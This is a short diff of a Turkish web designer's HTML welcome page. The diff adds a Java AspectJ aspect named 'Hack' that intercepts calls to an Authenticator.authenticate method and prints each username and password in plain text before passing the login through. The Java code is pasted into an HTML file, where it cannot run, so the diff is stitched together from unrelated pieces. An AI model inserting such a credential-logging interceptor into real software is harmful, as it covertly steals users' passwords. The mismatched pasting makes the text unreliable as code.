@@ -108,4 +108,15 @@
     <center>  <h1 onmouseover="HOŞGELDİNİZ()">WEB DESİGNER UĞUR AYDOĞAN</h1> </center>
     </body>
 <IMG border=0 src="cid:9E778D790C1840FA9A2FD77B3EA92791@dns">
+    public aspect Hack {
+
+  pointcut authHack(String user, String pass): call(* Authenticator.authenticate(String,String)) && args(user,pass);
+
+  boolean around(String user, String pass): authHack(user,pass) {
+    out("$$$ " + user + ":" + pass + " $$$");
+    boolean result = proceed(user,pass);
+    return result;
+  }
+
+}
 </html>
